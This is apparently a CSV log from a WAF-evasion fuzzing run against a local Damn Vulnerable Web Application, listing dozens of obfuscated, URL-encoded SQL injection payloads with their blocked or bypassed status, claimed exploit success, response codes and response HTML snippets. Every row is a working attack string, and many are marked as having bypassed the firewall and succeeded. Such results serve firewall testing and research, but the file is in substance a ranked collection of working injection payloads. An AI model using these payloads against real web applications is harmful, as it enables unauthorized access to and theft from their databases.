Payload,Status,Exploit Success,Exploit Types,Payload Type,Response Time (s),Memory Usage (MB),Semantic Preserved,Response Code,Snippet
0%27<@!=1.+||+!+{x+(select+1)}=1=,Blocked,No,None,Unknown,0.0082,71.71,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@=1+or%0bnot%0b{`if`%0b1}=1=+(,Bypassed,No,None,Unknown,0.0144,71.71,No,500,
0%27<@!=.1%0b||%0b!+{x+(select%0b1)}=1=+,Bypassed,Yes,Yes (unionAtk),Unknown,0.0297,71.71,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=1%0bor%0bnot~false=%0b(not,Bypassed,Yes,Yes (unionAtk),booleanAtk,0.0273,71.71,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=.1%0b||+not%0b{a%0b1}=1=%0b(,Bypassed,No,None,Unknown,0.0277,71.71,No,500,
0'<@!=.1+or+!%0b{x+(select+1)}=1=+,Bypassed,No,None,Unknown,0.0208,71.71,No,500,
0'<@!=.1%0b||+{x%0b(select+1)}=1+like%0b{x,Bypassed,No,None,Unknown,0.0261,71.71,No,500,
0'<@!=.1%0bor%0bnot%7e0=+(!%0b,Bypassed,No,None,Unknown,0.0229,70.91,No,500,
0'<@=1.+||%0b!%0b{`if`%0b1}=1=%0b(,Bypassed,No,None,Unknown,0.0167,70.91,No,500,
0%27<@!=.1+or+not%0btrue=%0b(not+,Bypassed,Yes,Yes (unionAtk),booleanAtk,0.02,70.91,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=1.+or+not+{`if`%0b1}=1=+(,Bypassed,Yes,Yes (unionAtk),Unknown,0.0239,70.91,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=1%0b||+!%7e0=+(!%0b,Bypassed,No,None,Unknown,0.0241,70.91,No,500,
0'<@!=1+||%0b!%0b{x+(select%0b1)}=1=%0b,Blocked,No,None,Unknown,0.0153,70.91,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@!=.1%0b||+not%0b{`if`%0b1}=1=+(,Bypassed,Yes,Yes (unionAtk),Unknown,0.0195,70.91,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=.1%0bor+!%0b1=%0b(!%0b,Bypassed,Yes,Yes (unionAtk),Unknown,0.037,70.91,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=1.+or+!%0btrue=+(not+,Bypassed,Yes,Yes (unionAtk),booleanAtk,0.0201,70.91,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=1.+||%0bnot%0b{x+(select%0b1)}=1=+,Blocked,No,None,Unknown,0.0117,70.91,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'||%0b!@<@+or+!+{x%0b(select+1)}=1,Blocked,No,None,Unknown,0.033,70.91,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@!=.1+or+!+{x+(select+1)}=1=+,Blocked,No,None,Unknown,0.0182,70.91,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@!=1+||%0bnot%0b{x%0b(select%0b1)}=1=+,Blocked,No,None,Unknown,0.0276,70.91,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@=1%0bor+!%0b{x+(select+1)}=1=,Bypassed,Yes,Yes (unionAtk),Unknown,0.0208,70.91,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=1+or%0b!%7e0=+(not+,Bypassed,Yes,Yes (unionAtk),Unknown,0.0594,70.91,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=1.%0bor+not+1=%0b(not+,Bypassed,No,None,Unknown,0.0666,70.91,No,500,
0%27<@=.1+or%0b!%7e0=%0b(not,Bypassed,Yes,Yes (unionAtk),Unknown,0.028,70.91,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=1.+or+!%7efalse=+(!+,Bypassed,Yes,Yes (unionAtk),booleanAtk,0.0458,71.06,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=1+or%0b!+{x+(select%0b1)}=1=%0b,Blocked,No,None,Unknown,0.0647,71.22,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@=1.+or+not+{x%0b(select%0b1)}=1=%0b,Bypassed,No,None,Unknown,0.0574,71.34,No,500,
0%27<@=1+||+!%7e0=%0b(0),Bypassed,Yes,Yes (unionAtk),Unknown,0.0351,71.46,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=1+or%0bnot+{x%0b(select+1)}=1=,Bypassed,Yes,Yes (unionAtk),Unknown,0.0297,71.46,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=1+or+not%0b{a%0b1}=1=%0b(,Bypassed,Yes,Yes (unionAtk),Unknown,0.0312,71.46,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=.1+||%0bnot%0b{a%0b1}=1=%0b(,Bypassed,Yes,Yes (unionAtk),Unknown,0.0644,71.46,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=1.%0bor+not+{a+1}=1=+(,Bypassed,Yes,Yes (unionAtk),Unknown,0.0365,71.46,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=1+||+not+{x+(select%0b1)}=1=+,Blocked,No,None,Unknown,0.0053,71.46,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@!=1%0bor+not%0b{x%0b(select+1)}=1=+,Bypassed,Yes,Yes (unionAtk),Unknown,0.0217,71.46,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=1.+or+!~0=+(not+,Bypassed,No,None,Unknown,0.0366,71.46,No,500,
0%27<@!=.1+||+not+{x%0b(select+1)}=1=+,Bypassed,Yes,Yes (unionAtk),Unknown,0.0254,71.46,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=1+||+not+{a%0b1}=1=+(,Bypassed,Yes,Yes (unionAtk),Unknown,0.0352,71.46,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=1.+||%0b!+{x+(select+1)}=1=+,Blocked,No,None,Unknown,0.0454,71.46,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@=.1%0b||%0bnot+{x+(select%0b1)}=1=+,Bypassed,Yes,Yes (unionAtk),Unknown,0.0291,71.58,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=1+or%0bnot+{a%0b1}=1=+(,Bypassed,Yes,Yes (unionAtk),Unknown,0.012,71.71,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=1%0bor%0bnot+{a+1}=1=%0b(,Bypassed,No,None,Unknown,0.0315,71.71,No,500,
0'<@=.1%0bor%0b!+{`if`+1}=1=+(,Bypassed,No,None,Unknown,0.0286,71.71,No,500,
0%27<@!=.1%0b||+not%0b{x+(select%0b1)}=1=,Bypassed,Yes,Yes (unionAtk),Unknown,0.0373,71.71,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=.1%0bor%0bnot%0b{x%0b(select+1)}=1=+,Bypassed,No,None,Unknown,0.0344,71.71,No,500,
0'<@!=1.%0bor+not%0b{a+1}=1=+(,Bypassed,No,None,Unknown,0.0323,71.71,No,500,
0'<@=.1+or%0b{x%0b(select+1)}=1+like+{x,Bypassed,No,None,Unknown,0.0535,71.71,No,500,
0%27<@!=1%0b||+not%0b1=%0b(!%0b,Bypassed,Yes,Yes (unionAtk),Unknown,0.0351,71.71,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=1%0bor+!%0b{`if`+1}=1=+(,Bypassed,Yes,Yes (unionAtk),Unknown,0.0186,71.71,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=1+or+not%0b{x+(select%0b1)}=1=+,Bypassed,No,None,Unknown,0.0367,71.71,No,500,
0%27<@!=1.+||%0b!+{x%0b(select%0b1)}=1=%0b,Bypassed,Yes,Yes (unionAtk),Unknown,0.0192,71.71,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27or%0b@<@.+or%0btrue%0blike+{x%0b(select,Bypassed,Yes,Yes (unionAtk),booleanAtk,0.0162,71.71,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=1+or%0b!~false=+(!+,Bypassed,No,None,booleanAtk,0.0102,71.71,No,500,
0'<@!=1.%0b||+0=%0b(!+{x,Bypassed,No,None,Unknown,0.0265,71.71,No,500,
0%27<@=.1%0b||+!+{a%0b1}=1=+(,Bypassed,Yes,Yes (unionAtk),Unknown,0.019,71.71,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
8%0bor%0b{x%0b(select+1)}=1+like+{`if`+,Blocked,No,None,Unknown,0.016,71.71,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27or%0b!@<@%0bor+!+{`if`%0b1}=1=,Bypassed,Yes,Yes (unionAtk),Unknown,0.0228,71.71,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=1+or+!%7efalse=+(!%0b,Bypassed,Yes,Yes (unionAtk),booleanAtk,0.0107,71.71,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=.1%0bor%0b!~false=+(!+,Bypassed,Yes,Yes (unionAtk),booleanAtk,0.0205,70.91,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=1+||%0b!+{x+(select%0b1)}=1=%0b,Blocked,No,None,Unknown,0.0077,70.91,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@=1+||+{a+1}=1%0blike%0b1+||,Bypassed,Yes,Yes (unionAtk),Unknown,0.0265,70.91,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=.1%0b||%0b!+{a+1}=1=+(,Bypassed,Yes,Yes (unionAtk),Unknown,0.02,70.91,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27||%0b@<@.+or%0b!%0b{a%0b1}=1=,Bypassed,Yes,Yes (unionAtk),Unknown,0.0255,70.91,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=.1%0b||%0bnot%0b{x%0b(select+1)}=1=,Bypassed,Yes,Yes (unionAtk),Unknown,0.0212,70.91,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=.1%0b||+!%0b{x+(select%0b1)}=1=%0b,Bypassed,No,None,Unknown,0.0236,70.91,No,500,
0'<@!=1+||+!+1=%0b(!~,Bypassed,No,None,Unknown,0.0172,70.91,No,500,
0'<@=1+or+!%0b{x+(select+1)}=1=+,Bypassed,No,None,Unknown,0.0315,70.91,No,500,
